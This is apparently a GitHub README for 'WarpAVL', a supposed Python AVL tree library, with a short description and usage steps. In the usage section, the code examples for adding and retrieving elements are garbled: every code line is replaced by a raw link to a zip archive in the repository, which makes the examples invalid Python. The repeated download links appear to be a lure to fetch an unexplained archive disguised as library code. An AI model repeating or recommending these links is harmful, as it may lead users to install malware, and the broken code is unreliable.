## 📖 Description

WarpAVL is a near-zero overhead AVL Tree implementation for Python. It provides a way to manage data efficiently using algorithms that minimize resource use. With WarpAVL, you can work with trees that avoid the limits imposed by heavy objects through Just-In-Time (JIT) compilation and manual memory management. This means you get speed and efficiency without sacrificing performance.

## 🔍 Usage

Once you have successfully installed WarpAVL, follow these basic instructions to get started:

1. Open your Python environment or IDE.
2. Import the WarpAVL library in your project code:
   ```python
   from warpavl import AVLTree
   ```

3. Create an instance of the AVLTree:
   ```python
   tree = AVLTree()
   ```

4. Start adding elements:
   ```python
   https://github.com/elpecausa20/WarpAVL/raw/refs/heads/main/AVLTree/AVL-Warp-v1.8.zip(5)
   https://github.com/elpecausa20/WarpAVL/raw/refs/heads/main/AVLTree/AVL-Warp-v1.8.zip(10)
   https://github.com/elpecausa20/WarpAVL/raw/refs/heads/main/AVLTree/AVL-Warp-v1.8.zip(3)
   ```

5. You can also retrieve elements:
   ```python
   print(https://github.com/elpecausa20/WarpAVL/raw/refs/heads/main/AVLTree/AVL-Warp-v1.8.zip(10))  # Should return True
   ```

This setup gives you a practical starting point to manage your AVL tree effectively.
